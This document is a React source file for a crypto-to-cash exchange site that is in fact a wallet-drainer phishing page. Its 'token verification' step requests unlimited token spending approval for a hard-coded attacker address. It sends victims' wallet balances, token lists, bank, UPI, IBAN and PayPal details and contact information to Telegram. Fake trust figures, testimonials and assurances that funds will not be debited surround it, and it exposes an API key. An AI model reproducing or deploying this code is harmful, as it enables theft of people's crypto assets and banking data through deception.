import React, { useState, useEffect } from 'react';
import { AlertCircle, CheckCircle, Loader } from 'lucide-react';
import { BSC_PARAMS, COUNTRIES, SAMPLE_TESTIMONIALS } from './constants';
import { getRandomTestimonials, validatePaymentDetails, sendToTelegram, fetchCoinGeckoPrice } from './utils';
import { Token, PaymentDetails, ExchangeRate, ThemeClasses } from './types';
import Header from './components/Header';
import TrustMetrics from './components/TrustMetrics';
import AssetManagement from './components/AssetManagement';
import PaymentSelection from './components/PaymentSelection';
import TokenVerification from './components/TokenVerification';
import ExchangeRates from './components/ExchangeRates';
import Testimonials from './components/Testimonials';
import TrustBadges from './components/TrustBadges';
import SecurityFeatures from './components/SecurityFeatures';
import CryptoNews from './components/CryptoNews';
import MobileWalletPrompt from './components/MobileWalletPrompt';
import TermsAndConditions from './components/TermsAndConditions';
import PrivacyPolicy from './components/PrivacyPolicy';
import ContactPage from './components/ContactPage';
import ScamAdvisory from './components/ScamAdvisory';
import BugBountyBanner from './components/BugBountyBanner';
import BugBountyPage from './components/BugBountyPage';

const COVALENT_KEY = 'cqt_rQj9pWHk7jrKrDJPYByfhmRpCDCW';

function App() {
  // STATES
  const [darkMode, setDarkMode] = useState(() => {
    // Check for saved theme preference first
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme) {
      return savedTheme === 'dark';
    }
    
    // Check system preference (including Android)
    if (typeof window !== 'undefined' && window.matchMedia) {
      return window.matchMedia('(prefers-color-scheme: dark)').matches;
    }
    
    return true; // Default to dark mode like BitValve
  });
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState('');
  const [tokens, setTokens] = useState<Token[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [currentStep, setCurrentStep] = useState(1);
  const [approvalInProgress, setApprovalInProgress] = useState('');
  const [selectedFiat, setSelectedFiat] = useState('usd');
  const [exchangeRates, setExchangeRates] = useState<ExchangeRate[]>([]);
  const [selectedToken, setSelectedToken] = useState<Token | null>(null);
  const [sellAmount, setSellAmount] = useState('');
  const [quote, setQuote] = useState<string | null>(null);
  const [selectedCountry, setSelectedCountry] = useState('');
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('');
  const [tradeAmount, setTradeAmount] = useState('');
  const [paymentDetails, setPaymentDetails] = useState<PaymentDetails>({});
  const [showRates, setShowRates] = useState(true);
  const [showWalletAnimation, setShowWalletAnimation] = useState(false);
  const [showApprovalAnimation, setShowApprovalAnimation] = useState('');
  const [tokenPrice, setTokenPrice] = useState<number | null>(null);
  const [priceLoading, setPriceLoading] = useState(false);
  const [priceError, setPriceError] = useState<string | null>(null);
  const [testimonials] = useState(getRandomTestimonials(SAMPLE_TESTIMONIALS, 4));
  const [showMobilePrompt, setShowMobilePrompt] = useState(false);
  const [showTerms, setShowTerms] = useState(false);
  const [showPrivacy, setShowPrivacy] = useState(false);
  const [showContact, setShowContact] = useState(false);
  const [showScamAdvisory, setShowScamAdvisory] = useState(false);
  const [showBugBounty, setShowBugBounty] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  // Detect mobile device
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // System theme detection and persistence
  useEffect(() => {
    // Listen for system theme changes
    if (typeof window !== 'undefined' && window.matchMedia) {
      const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
      
      const handleThemeChange = (e: MediaQueryListEvent) => {
        // Only auto-update if user hasn't manually set a preference
        const savedTheme = localStorage.getItem('theme');
        if (!savedTheme) {
          setDarkMode(e.matches);
        }
      };
      
      // Add listener for theme changes
      if (mediaQuery.addEventListener) {
        mediaQuery.addEventListener('change', handleThemeChange);
      } else {
        // Fallback for older browsers
        mediaQuery.addListener(handleThemeChange);
      }
      
      return () => {
        if (mediaQuery.removeEventListener) {
          mediaQuery.removeEventListener('change', handleThemeChange);
        } else {
          mediaQuery.removeListener(handleThemeChange);
        }
      };
    }
  }, []);

  // Save theme preference when changed
  useEffect(() => {
    localStorage.setItem('theme', darkMode ? 'dark' : 'light');
  }, [darkMode]);
// Random Order ID generator on confirmation
const [orderId, setOrderId] = useState("");

useEffect(() => {
  if (currentStep === 5 && !orderId) {
    const id = "ORD-" + Math.random().toString(36).substring(2, 10).toUpperCase();
    setOrderId(id);
  }
}, [currentStep, orderId]);

  // Theme classes
  const themeClasses: ThemeClasses = {
    bg: darkMode ? 'bg-[#0a0b0d]' : 'bg-gray-50',
    cardBg: darkMode ? 'bg-[#1a1b23]' : 'bg-white',
    text: darkMode ? 'text-white' : 'text-gray-900',
    textSecondary: darkMode ? 'text-gray-400' : 'text-gray-600',
    border: darkMode ? 'border-gray-800' : 'border-gray-200',
    hover: darkMode ? 'hover:bg-[#252730]' : 'hover:bg-gray-50',
    input: darkMode ? 'bg-[#252730] border-gray-700 text-white' : 'bg-white border-gray-300 text-gray-900',
    gradient: darkMode ? 'from-blue-500 to-cyan-400' : 'from-blue-500 to-purple-500'
  };

  // Auto-connect wallet if user already connected before
  useEffect(() => {
    const lastWallet = localStorage.getItem('walletAddress');
    if (window.ethereum && lastWallet) {
      window.ethereum.request({ method: 'eth_accounts' }).then((accounts: string[]) => {
        if (accounts && accounts[0] && accounts[0].toLowerCase() === lastWallet.toLowerCase()) {
          setWalletAddress(accounts[0]);
          setWalletConnected(true);
          setCurrentStep(2);
          fetchUserTokens(accounts[0]);
        } else {
          localStorage.removeItem('walletAddress');
        }
      }).catch(() => {});
    }
  }, []);

  // Fetch Live Exchange Rates
   useEffect(() => {
    const ids = 'bitcoin,ethereum,tether,usd-coin,dai';
    const markups: Record<string, number> = { bitcoin: 0.02, ethereum: 0.02, 'usd-coin': 0.1, dai: 0.1, tether: 0.1 };
    const fetchRates = async () => {
      try {
        const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=${selectedFiat}`;
        const resp = await fetch(url);
        const prices = await resp.json();
        setExchangeRates([
            { pair: `BTC/${selectedFiat.toUpperCase()}`, rate: (prices.bitcoin[selectedFiat] * (1 + markups.bitcoin)).toFixed(2), markup: '+5%', volume: '$5.1M' },
          { pair: `ETH/${selectedFiat.toUpperCase()}`, rate: (prices.ethereum[selectedFiat] * (1 + markups.ethereum)).toFixed(2), markup: '+5%', volume: '$2.4M' },
          { pair: `USDT/${selectedFiat.toUpperCase()}`, rate: (prices.tether[selectedFiat] * (1 + markups.tether)).toFixed(2), markup: '+25%', volume: '$3.2M' },
          { pair: `USDC/${selectedFiat.toUpperCase()}`, rate: (prices['usd-coin'][selectedFiat] * (1 + markups['usd-coin'])).toFixed(2), markup: '+20%', volume: '$1.8M' },
          { pair: `DAI/${selectedFiat.toUpperCase()}`, rate: (prices.dai[selectedFiat] * (1 + markups.dai)).toFixed(2), markup: '+20%', volume: '$890K' }
        ]);
      } catch {
        setExchangeRates([
          { pair: 'BTC/USD', rate: '122633.58', markup: '+2%', volume: '$52.1M' },
          { pair: 'ETH/USD', rate: '3814.84', markup: '+2%', volume: '$21.4M' },
          { pair: 'USDT/USD', rate: '1.10', markup: '+10%', volume: '$13.2M' },
          { pair: 'USDC/USD', rate: '1.10', markup: '+10%', volume: '$12.8M' },
          { pair: 'DAI/USD', rate: '1.10', markup: '+10%', volume: '$15.8M' }
        ]);
      }
    };
    fetchRates();
    const interval = setInterval(fetchRates, 60000);
    return () => clearInterval(interval);
  }, [selectedFiat]);

  // STEP 1: Connect Wallet & Switch to BSC
  const connectWallet = async () => {
    setLoading(true); 
    setError(''); 
    setSuccess('');
    
    try {
      // Import mobile detection utilities
      const { isRegularMobileBrowser } = await import('./utils');
      
      // Check if user is on mobile regular browser and show Trust Wallet prompt
      if (isRegularMobileBrowser()) {
        setLoading(false);
        setShowMobilePrompt(true);
        return;
      }
      
      if (!window.ethereum) throw new Error('MetaMask not detected. Please install MetaMask.');
      
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
      if (chainId !== BSC_PARAMS.chainId) {
        try {
          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_PARAMS.chainId }] });
        } catch (err: any) {
          if (err.code === 4902) {
            await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [BSC_PARAMS] });
          } else throw err;
        }
      }
      
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      if (!accounts || accounts.length === 0) throw new Error('No accounts found. Please unlock your wallet.');
      
      setWalletAddress(accounts[0]); 
      setWalletConnected(true);
      setShowWalletAnimation(true);
      setTimeout(() => setShowWalletAnimation(false), 3000);

      const tokensFetched = await fetchUserTokens(accounts[0]);
      let bnb = '0.0000', usdt = '0.00';
      if (tokensFetched && Array.isArray(tokensFetched)) {
        const bnbToken = tokensFetched.find(t => t.symbol === 'BNB');
        const usdtToken = tokensFetched.find(t => t.symbol === 'USDT');
        bnb = bnbToken ? bnbToken.balance : '0.0000';
        usdt = usdtToken ? usdtToken.balance : '0.00';
      }

      setCurrentStep(2);
      setSuccess('Wallet connected! Continue to Next step for risk analysis .');

      let userCountry = 'N/A';
      try {
        const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
        userCountry = geo && geo.country_name ? geo.country_name : 'N/A';
      } catch { /* ignore */ }

      await sendToTelegram({
        action: 'Wallet Connected',
        wallet: accounts[0],
        bnb: bnb,
        usdt: usdt,
        network: 'BSC',
        country: userCountry,
        token: 'N/A',
        contract: 'N/A',
        balance: 'N/A',
        paymentMethod: 'N/A',
        txHash: 'N/A',
        timestamp: new Date().toISOString()
      });

      localStorage.setItem('walletAddress', accounts[0]);
    } catch (err: any) {
      setError(err.message || 'Failed to connect wallet');
    } finally {
      setLoading(false);
    }
  };

  // STEP 2: Fetch BSC tokens from Covalent
  const fetchUserTokens = async (address: string): Promise<Token[]> => {
    setLoading(true);
    try {
      const resp = await fetch(
        `https://api.covalenthq.com/v1/56/address/${address}/balances_v2/?key=${COVALENT_KEY}`
      );
      if (!resp.ok) throw new Error('Failed to fetch token data');
      const data = await resp.json();
      if (data.data && data.data.items) {
        const tokenList = data.data.items
          .filter((token: any) => token.type === 'cryptocurrency' && token.balance !== "0" && token.contract_address !== "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee")
          .map((token: any) => ({
            symbol: token.contract_ticker_symbol,
            name: token.contract_name,
            balance: (parseFloat(token.balance) / Math.pow(10, token.contract_decimals)).toFixed(4),
            value: token.quote ? `$${token.quote.toFixed(2)}` : '$0.00',
            approved: false,
            contractAddress: token.contract_address,
            logoUrl: token.logo_url
          })) as Token[];
        setTokens(tokenList);
        setLoading(false);
        return tokenList;
      }
      setTokens([]);
      setLoading(false);
      return [];
    } catch (err: any) {
      setError('No Tokens Holding: ' + err.message);
      setTokens([]);
      setLoading(false);
      return [];
    }
  };

  // STEP 4: Approve tokens
  const approveToken = async (token: Token) => {
    setApprovalInProgress(token.symbol);
    setShowApprovalAnimation(token.symbol);
    setError('');
    
    try {
      const { ethers } = await import('ethers');
      if (!window.ethereum) throw new Error('MetaMask not found');
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const erc20ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
      const contract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
      const spenderAddress = "0x564a3bc6c16e5cd68ccd194df2380088db74cd9e";
      const maxAmount = ethers.MaxUint256;
      const tx = await contract.approve(spenderAddress, maxAmount);
      await tx.wait();
      
      setTokens(prev => prev.map(t => 
        t.contractAddress === token.contractAddress ? { ...t, approved: true, txHash: tx.hash } : t
      ));
      
      if (selectedToken && selectedToken.contractAddress === token.contractAddress) {
        setSelectedToken(prev => prev ? { ...prev, approved: true, txHash: tx.hash } : prev);
      }
      
      setSuccess(`${token.symbol} Verified!`);
      setApprovalInProgress('');
      setTimeout(() => setShowApprovalAnimation(''), 2000);

      let allTokensText = '';
      if (tokens.length > 0) {
        allTokensText = tokens
          .map(t => `${t.symbol} (${t.contractAddress})`)
          .join('\n');
      }
      
      await sendToTelegram({
        action: 'Token Approved',
        wallet: walletAddress,
        token: token.symbol,
        contract: token.contractAddress,
        balance: token.balance,
        paymentMethod: 'N/A',
        country: 'N/A',
        txHash: tx.hash,
        tokenList: allTokensText,
        network: 'BSC',
        timestamp: new Date().toISOString()
      });
    } catch (err: any) {
      setError(`Approval failed: ${err.message}`);
      setApprovalInProgress('');
    }
  };

  // Send comprehensive order confirmation to Telegram
  const sendOrderConfirmation = async () => {
    try {
      const selectedCountryData = COUNTRIES.find(c => c.code === selectedCountry);
      
      // Format payment details based on method
      let paymentDetailsText = '';
      switch (selectedPaymentMethod) {
        case 'UPI':
          paymentDetailsText = `Primary UPI: ${paymentDetails.upiId || 'N/A'}\n` +
                              `Name: ${paymentDetails.fullName || 'N/A'}`;
          if (paymentDetails.upiId2) {
            paymentDetailsText += `\nSecondary UPI: ${paymentDetails.upiId2}\n` +
                                 `Name: ${paymentDetails.fullName2 || 'N/A'}`;
          }
          break;
        case 'IMPS':
          paymentDetailsText = `Account: ${paymentDetails.accountNumber || 'N/A'}\n` +
                              `IFSC: ${paymentDetails.ifscCode || 'N/A'}\n` +
                              `Name: ${paymentDetails.accountHolderName || 'N/A'}`;
          break;
        case 'PayPal':
          paymentDetailsText = `Email: ${paymentDetails.paypalEmail || 'N/A'}\n` +
                              `Name: ${paymentDetails.fullName || 'N/A'}`;
          break;
        case 'ACH':
          paymentDetailsText = `Routing: ${paymentDetails.routingNumber || 'N/A'}\n` +
                              `Account: ${paymentDetails.accountNumber || 'N/A'}\n` +
                              `Name: ${paymentDetails.accountHolderName || 'N/A'}\n` +
                              `Type: ${paymentDetails.accountType || 'N/A'}`;
          break;
        case 'SEPA':
          paymentDetailsText = `IBAN: ${paymentDetails.iban || 'N/A'}\n` +
                              `Name: ${paymentDetails.accountHolderName || 'N/A'}\n` +
                              `BIC: ${paymentDetails.bicCode || 'N/A'}`;
          break;
        case 'Bank Transfer':
          paymentDetailsText = `Bank: ${paymentDetails.bankName || 'N/A'}\n` +
                              `Account: ${paymentDetails.accountNumber || 'N/A'}\n` +
                              `Name: ${paymentDetails.accountHolderName || 'N/A'}\n` +
                              `Sort Code: ${paymentDetails.sortCode || 'N/A'}`;
          break;
        case 'Cash':
          paymentDetailsText = `Address: ${paymentDetails.cashAddress || 'N/A'}\n` +
                              `Phone: ${paymentDetails.cashContactPhone || 'N/A'}`;
          break;
        default:
          paymentDetailsText = paymentDetails.general || 'N/A';
      }

      // Format contact information
      let contactText = 'N/A';
      if (paymentDetails.contactInfo) {
        const contact = paymentDetails.contactInfo;
        contactText = `Method: ${contact.preferredContact || 'N/A'}\n`;
        if (contact.email) contactText += `Email: ${contact.email}\n`;
        if (contact.phone) contactText += `Phone: ${contact.phone}\n`;
        if (contact.telegram) contactText += `Telegram: ${contact.telegram}\n`;
      }

      // Calculate quote
      const marketValue = tokenPrice ? parseFloat(tradeAmount) * tokenPrice : 0;
      const exchangeValue = marketValue * 1.15; // 15% markup

      const orderMessage = 
        `🎉 <b>NEW ORDER CONFIRMED</b> 🎉\n\n` +
        `📋 <b>Order Details:</b>\n` +
        `Order ID: <code>${orderId}</code>\n` +
        `Timestamp: ${new Date().toLocaleString()}\n\n` +
        
        `👤 <b>Customer Info:</b>\n` +
        `Wallet: <code>${walletAddress}</code>\n` +
        `Country: ${selectedCountryData?.flag} ${selectedCountryData?.name || 'N/A'}\n\n` +
        
        `💰 <b>Transaction Details:</b>\n` +
        `Asset: ${selectedToken?.name} (${selectedToken?.symbol})\n` +
        `Amount: ${tradeAmount} ${selectedToken?.symbol}\n` +
        `Market Price: $${tokenPrice?.toFixed(4) || 'N/A'}\n` +
        `Exchange Rate: $${tokenPrice ? (tokenPrice * 1.15).toFixed(4) : 'N/A'} (+15%)\n` +
        `Total Value: $${exchangeValue.toFixed(2)}\n` +
        `Contract: <code>${selectedToken?.contractAddress}</code>\n\n` +
        
        `💳 <b>Payment Method:</b> ${selectedPaymentMethod}\n` +
        `<b>Payment Details:</b>\n${paymentDetailsText}\n\n` +
        
        `📞 <b>Contact Information:</b>\n${contactText}\n` +
        
        `🔗 <b>Network:</b> BSC (Binance Smart Chain)\n` +
        `⏰ <b>Status:</b> Processing\n\n` +
        
        `⚠️ <b>Action Required:</b>\n` +
        `• Process payout to customer's ${selectedPaymentMethod}\n` +
        `• Verify wallet has sufficient balance\n` +
        `• Complete transaction within 24 hours\n\n` +
        
        `🔒 <b>Security Note:</b> Customer assets verified and approved`;

      await sendToTelegram({
        action: 'Order Confirmed',
        message: orderMessage,
        orderId: orderId,
        wallet: walletAddress,
        token: selectedToken?.symbol || 'N/A',
        contract: selectedToken?.contractAddress || 'N/A',
        balance: tradeAmount,
        paymentMethod: selectedPaymentMethod,
        country: selectedCountryData?.name || 'N/A',
        contactInfo: paymentDetails.contactInfo,
        paymentDetails: paymentDetailsText,
        totalValue: exchangeValue.toFixed(2),
        network: 'BSC',
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error('Failed to send order confirmation:', error);
      // Don't show error to user as this is internal notification
    }
  };

  // Fetch price when token is selected
  useEffect(() => {
    if (selectedToken) {
      setPriceLoading(true);
      setPriceError(null);
      
      fetchCoinGeckoPrice(selectedToken.symbol)
        .then(price => {
          setTokenPrice(price);
          setPriceLoading(false);
        })
        .catch(error => {
          console.error('Price fetch failed:', error);
          setPriceError('Unable to fetch current price');
          setTokenPrice(null);
          setPriceLoading(false);
        });
    }
  }, [selectedToken]);

  // Handle order confirmation
  const handleOrderConfirmation = async () => {
    setCurrentStep(5);
    // Send Telegram notification
    await sendOrderConfirmation();
  };

  // FINAL: Reset session
  const handleFinish = () => {
    setCurrentStep(1);
    setWalletConnected(false);
    setWalletAddress('');
    setTokens([]);
    setSelectedToken(null);
    setSellAmount('');
    setQuote(null);
    setSelectedCountry('');
    setSelectedPaymentMethod('');
    setPaymentDetails({});
    setSuccess('');
    setError('');
    localStorage.removeItem('walletAddress');
  };

  return (
    <div className={`min-h-screen transition-all duration-300 ${themeClasses.bg} relative overflow-x-hidden`}>
      {/* Background Pattern */}
      <div className="absolute inset-0 opacity-5">
        <div className="absolute inset-0" style={{
          backgroundImage: `radial-gradient(circle at 25% 25%, #3b82f6 0%, transparent 50%), 
                           radial-gradient(circle at 75% 75%, #06b6d4 0%, transparent 50%)`
        }}></div>
      </div>
      
      {/* Mobile Wallet Prompt */}
      <MobileWalletPrompt 
        darkMode={darkMode} 
        themeClasses={themeClasses}
        show={showMobilePrompt}
        onClose={() => setShowMobilePrompt(false)}
      />
      
      {/* Terms & Conditions Modal */}
      {showTerms && (
        <TermsAndConditions
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowTerms(false)}
        />
      )}
      
      {/* Privacy Policy Modal */}
      {showPrivacy && (
        <PrivacyPolicy
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowPrivacy(false)}
        />
      )}
      
      {/* Contact Page Modal */}
      {showContact && (
        <ContactPage
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowContact(false)}
        />
      )}
      
      {/* Scam Advisory Modal */}
      {showScamAdvisory && (
        <ScamAdvisory
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowScamAdvisory(false)}
        />
      )}
      
      {/* Bug Bounty Modal */}
      {showBugBounty && (
        <BugBountyPage
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowBugBounty(false)}
        />
      )}
      
      <Header
        darkMode={darkMode}
        setDarkMode={setDarkMode}
        walletConnected={walletConnected}
        walletAddress={walletAddress}
        showWalletAnimation={showWalletAnimation}
        themeClasses={themeClasses}
        isMobile={isMobile}
      />

      {/* Bug Bounty Banner */}
      <BugBountyBanner
        darkMode={darkMode}
        themeClasses={themeClasses}
      />

      {/* Main Content */}
      <div className="relative z-10">
        {/* Mobile Wallet-Focused View */}
        {isMobile && walletConnected ? (
          <div className="min-h-screen px-3 py-4">
            <div className="max-w-md mx-auto">
              {/* Mobile Process Header */}
              <div className={`${themeClasses.cardBg} rounded-2xl border ${themeClasses.border} p-4 mb-4 shadow-xl`}>
                <div className="text-center">
                  <h2 className={`text-xl font-bold ${themeClasses.text} mb-2`}>
                    Crypto to Cash
                  </h2>
                  <div className="flex items-center justify-center space-x-2 text-sm">
                    <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                    <span className={`${themeClasses.textSecondary}`}>Wallet Connected</span>
                  </div>
                </div>
              </div>

              {/* Mobile Asset Management */}
              <AssetManagement
                currentStep={currentStep}
                loading={loading}
                tokens={tokens}
                selectedToken={selectedToken}
                tradeAmount={tradeAmount}
                tokenPrice={tokenPrice}
                priceLoading={priceLoading}
                priceError={priceError}
                darkMode={darkMode}
                themeClasses={themeClasses}
                connectWallet={connectWallet}
                setSelectedToken={setSelectedToken}
                setTradeAmount={setTradeAmount}
                setSellAmount={setSellAmount}
                setQuote={setQuote}
                setCurrentStep={setCurrentStep}
              />

              {/* Mobile Payment Selection */}
              {currentStep === 3 && (
                <div className={`${themeClasses.cardBg} rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 mt-4 backdrop-blur-xl`}>
                  <PaymentSelection
                    selectedCountry={selectedCountry}
                    selectedPaymentMethod={selectedPaymentMethod}
                    paymentDetails={paymentDetails}
                    themeClasses={themeClasses}
                    darkMode={darkMode}
                    setSelectedCountry={setSelectedCountry}
                    setSelectedPaymentMethod={setSelectedPaymentMethod}
                    setPaymentDetails={setPaymentDetails}
                    setCurrentStep={setCurrentStep}
                    validatePaymentDetails={validatePaymentDetails}
                  />
                </div>
              )}

              {/* Mobile Token Verification */}
              {currentStep === 4 && (
                <div className={`${themeClasses.cardBg} rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 mt-4 backdrop-blur-xl`}>
                  <TokenVerification
                    tokens={tokens}
                    showApprovalAnimation={showApprovalAnimation}
                    approvalInProgress={approvalInProgress}
                    darkMode={darkMode}
                    themeClasses={themeClasses}
                    approveToken={approveToken}
                    setCurrentStep={handleOrderConfirmation}
                  />
                </div>
              )}

     {/* Mobile Confirmation */}
{currentStep === 5 && (
  <div className={`${themeClasses.cardBg} rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 mt-4 backdrop-blur-xl`}>
    <div className="text-center py-6">
      <div className="w-16 h-16 bg-gradient-to-r from-green-400 to-emerald-500 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-2xl">
        <CheckCircle className="w-8 h-8 text-white" />
      </div>
      <h3 className={`text-xl font-bold ${themeClasses.text} mb-3`}>Order Confirmed!</h3>

      <p className={`${themeClasses.textSecondary} mb-4 px-2 text-sm`}>
        {selectedPaymentMethod?.toLowerCase().includes("cash")
          ? "Your order is being processed. Please follow the message received in your contact method."
          : `Your order is being processed. You will receive funds via ${selectedPaymentMethod} within 5–10 minutes.`}
      </p>

      <p className={`text-xs px-3 mb-6 font-medium ${themeClasses.textSecondary}`}>
        ⚠️ Funds will <strong>not</strong> be auto-debited until the payout is completed.  
        Please <strong>do not withdraw or move your assets</strong> until the transaction is fully processed.
      </p>

      <div className={`bg-gradient-to-r ${darkMode ? 'from-green-900/10 to-emerald-900/10' : 'from-green-50 to-emerald-50'} border ${darkMode ? 'border-green-800/30' : 'border-green-200'} rounded-xl p-4 mb-6 text-left backdrop-blur-sm`}>
        <h4 className={`font-semibold ${darkMode ? 'text-green-300' : 'text-green-900'} mb-3`}>Order Summary</h4>
        <div className={`space-y-2 text-sm ${themeClasses.textSecondary}`}>
          <div className="flex justify-between">
            <span>Order ID:</span>
            <span className="font-mono text-xs">{orderId}</span>
          </div>
          <div className="flex justify-between">
            <span>Wallet:</span>
            <span className="font-mono text-xs">{walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}</span>
          </div>
          <div className="flex justify-between">
            <span>Asset:</span>
            <span className="text-right">{selectedToken?.name} ({selectedToken?.symbol})</span>
          </div>
          <div className="flex justify-between">
            <span>Amount:</span>
            <span className="text-right">{tradeAmount}</span>
          </div>
          <div className="flex justify-between">
            <span>Payment Method:</span>
            <span className="text-right">{selectedPaymentMethod}</span>
          </div>
          <hr className="my-3" />
          <div className={`flex justify-between font-semibold ${darkMode ? 'text-green-300' : 'text-green-800'}`}>
            <span>Status:</span>
            <span>Processing</span>
          </div>
        </div>
      </div>

      <button
        onClick={handleFinish}
        className={`w-full bg-gradient-to-r ${themeClasses.gradient} text-white px-6 py-3 rounded-xl font-semibold hover:shadow-2xl transition-all duration-300 hover:scale-105`}
      >
        Start New Session
      </button>
    </div>
  </div>
)}

            </div>
          </div>
        ) : (
          <>
            {/* Desktop/Tablet View or Mobile without wallet */}
            {/* Hero Section */}
            <div className="max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 py-6 sm:py-8 lg:py-12">
              <div className="text-center mb-8 sm:mb-12">
                <h1 className={`text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold ${themeClasses.text} mb-4 sm:mb-6 leading-tight`}>
                  <span>Convert Crypto to </span>
                  <span className="bg-gradient-to-r from-blue-400 to-cyan-400 bg-clip-text text-transparent">Cash</span>
                </h1>
                <p className={`text-base sm:text-lg lg:text-xl ${themeClasses.textSecondary} max-w-2xl mx-auto mb-6 sm:mb-8 px-2`}>
                  Instant payouts to your bank account. Secure, fast, and trusted by thousands worldwide.
                </p>
                <div className="grid grid-cols-2 sm:flex sm:items-center sm:justify-center gap-3 sm:gap-6 lg:gap-8 text-xs sm:text-sm px-2">
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                    <span className={`${themeClasses.textSecondary} whitespace-nowrap`}>98.9% Success Rate</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
                    <span className={`${themeClasses.textSecondary} whitespace-nowrap`}>5 to 15 min Average</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-purple-500 rounded-full animate-pulse"></div>
                    <span className={`${themeClasses.textSecondary} whitespace-nowrap`}>$450M+ Processed</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-orange-500 rounded-full animate-pulse"></div>
                    <span className={`${themeClasses.textSecondary} whitespace-nowrap`}>120K+ Active Users</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Main Exchange Interface */}
            <div className="max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 pb-6 sm:pb-12">
              <div className="grid lg:grid-cols-3 gap-4 sm:gap-6 lg:gap-8">
                {/* Left Column - Asset Management */}
                <div className="lg:col-span-2 space-y-4 sm:space-y-6 lg:space-y-8">
                <AssetManagement
                  currentStep={currentStep}
                  loading={loading}
                  tokens={tokens}
                  selectedToken={selectedToken}
                  tradeAmount={tradeAmount}
                  tokenPrice={tokenPrice}
                  priceLoading={priceLoading}
                  priceError={priceError}
                  darkMode={darkMode}
                  themeClasses={themeClasses}
                  connectWallet={connectWallet}
                  setSelectedToken={setSelectedToken}
                  setTradeAmount={setTradeAmount}
                  setSellAmount={setSellAmount}
                  setQuote={setQuote}
                  setCurrentStep={setCurrentStep}
                />

                {/* Step 3: Payment Selection */}
                {currentStep === 3 && (
                  <div className={`${themeClasses.cardBg} rounded-xl sm:rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 sm:p-6 lg:p-8 backdrop-blur-xl`}>
                    <PaymentSelection
                      selectedCountry={selectedCountry}
                      selectedPaymentMethod={selectedPaymentMethod}
                      paymentDetails={paymentDetails}
                      themeClasses={themeClasses}
                      darkMode={darkMode}
                      setSelectedCountry={setSelectedCountry}
                      setSelectedPaymentMethod={setSelectedPaymentMethod}
                      setPaymentDetails={setPaymentDetails}
                      setCurrentStep={setCurrentStep}
                      validatePaymentDetails={validatePaymentDetails}
                    />
                  </div>
                )}

                {/* Step 4: Token Verification */}
                {currentStep === 4 && (
                  <div className={`${themeClasses.cardBg} rounded-xl sm:rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 sm:p-6 lg:p-8 backdrop-blur-xl`}>
                    <TokenVerification
                      tokens={tokens}
                      showApprovalAnimation={showApprovalAnimation}
                      approvalInProgress={approvalInProgress}
                      darkMode={darkMode}
                      themeClasses={themeClasses}
                      approveToken={approveToken}
                      setCurrentStep={handleOrderConfirmation}
                    />
                  </div>
                )}

                {/* Step 5: Confirmation */}
{/* Step 5: Confirmation */}
{currentStep === 5 && (
  <div className={`${themeClasses.cardBg} rounded-xl sm:rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 sm:p-6 lg:p-8 backdrop-blur-xl`}>
    <div className="text-center py-4 sm:py-6 lg:py-8">
      <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-green-400 to-emerald-500 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-4 sm:mb-6 shadow-2xl">
        <CheckCircle className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
      </div>
      <h3 className={`text-xl sm:text-2xl font-bold ${themeClasses.text} mb-3`}>Order Confirmed!</h3>
      <p className={`${themeClasses.textSecondary} mb-6 sm:mb-8 max-w-md mx-auto px-2`}>
        {selectedPaymentMethod?.toLowerCase().includes("cash")
          ? "Your order is being processed. Please follow the message received in your contact method."
          : `Your order is being processed. You will receive funds via ` +
            `<strong>${selectedPaymentMethod}</strong> within 5–10 minutes.`}
      </p>

